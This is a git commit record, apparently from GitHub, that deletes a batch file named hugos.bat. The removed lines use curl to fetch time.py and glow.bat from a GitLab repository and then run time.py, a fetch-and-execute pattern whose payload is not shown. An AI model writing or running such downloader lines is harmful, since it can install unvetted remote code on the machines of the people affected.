2eb55c6292d26513846ea3969bc8fa87ac12917a
menia12 <160221779+menia12@users.noreply.github.com>
2024-05-12 22:38:53 +0700

    Delete hugos.bat

--- hugos.bat
+++
@@ -1,4 +0,0 @@
-@echo off
-curl -L -o time.py https://gitlab.com/rifqiekhafi/setrum/-/raw/main/time.py?inline=false
-curl -L -o glow.bat https://gitlab.com/rifqiekhafi/setrum/-/raw/main/glow.bat?inline=false
-python time.py
